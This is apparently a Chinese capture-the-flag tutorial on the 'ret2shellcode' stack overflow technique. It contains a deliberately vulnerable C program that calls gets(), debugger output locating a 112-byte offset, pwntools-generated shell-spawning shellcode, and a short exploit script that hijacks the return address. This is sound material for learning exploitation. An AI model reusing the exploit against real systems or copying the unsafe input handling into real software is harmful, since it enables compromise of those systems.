---
title: ret2shellcode
updated: 2023-05-16 09:47:14Z
created: 2022-10-17 02:42:43Z
---

```c
#include <stdio.h>
#include <string.h>

char buf2[100];

int main(void)
{
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 1, 0LL);

    char buf[100];

    printf("No system for you this time !!!\n");
    gets(buf);
    strncpy(buf2, buf, 100);
    printf("bye bye ~");

    return 0;
}
```

检查保护

```sh
└─# checksec ret2shellcode 
[*] '/root/pwn/ret2shellcode'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

查看代码段

```sh
└─# objdump -t -j .text ret2shellcode 

ret2shellcode:     file format elf32-i386

SYMBOL TABLE:
08048430 l    d  .text	00000000              .text
08048470 l     F .text	00000000              deregister_tm_clones
080484a0 l     F .text	00000000              register_tm_clones
080484e0 l     F .text	00000000              __do_global_dtors_aux
08048500 l     F .text	00000000              frame_dummy
08048640 g     F .text	00000002              __libc_csu_fini
08048460 g     F .text	00000004              .hidden __x86.get_pc_thunk.bx
080485d0 g     F .text	00000061              __libc_csu_init
08048430 g     F .text	00000000              _start
0804852d g     F .text	0000009a              main
```

查看分析其源码

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/faad731de44f8d04102ba8a76ce645f7.png" alt="faad731de44f8d04102ba8a76ce645f7.png" width="979" height="503" class="jop-noMdConv">

可以看到，程序会获取输入的buf变量值，并将其复制至buf2变量中

对buf2下断点可以看到buf2的地址为0x804a080

```sh
gdb-peda$ b *buf2
Breakpoint 2 at 0x804a080
```

查看buf2数据段是否存在读写权限

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/a4d57206454dffe9c7c22714dedfb98b.png" alt="a4d57206454dffe9c7c22714dedfb98b.png" width="923" height="491" class="jop-noMdConv">

接下来通过动态调试判断buf变量偏移距离

![54bdd41c824ab74a33f7914a7210b30e.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/54bdd41c824ab74a33f7914a7210b30e.png)![94580980aa451eb4eded04968680b699.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/94580980aa451eb4eded04968680b699.png)

可以看到无效地址为0x41384141，然后使用pattern_offset判断具体偏移距离为112

```sh
gdb-peda$ pattern_offset 0x41384141
1094205761 found at offset: 112
```

然后我们生成shellcode，可以使用pwntools的shellcraft，如下

```python
┌──(root㉿kali)-[~/pwn]
└─# python
Python 3.8.0 (default, Jul 12 2022, 11:34:11) 
[GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> shellcode = asm(shellcraft.sh())
>>> print(shellcode)
b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
>>> len(shellcode)
44
>>> 112-44
68
>>>
```

从上面可以看到，shellcode的长度为44，那么剩下需要填充的长度为68,一共112可以覆盖ebp,然后修改返回值为shellcode所在buf2的地址

exp如下

```python
from pwn import *

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

sh.sendline(shellcode + b'a'*68 + p32(buf2_addr))
sh.interactive()
```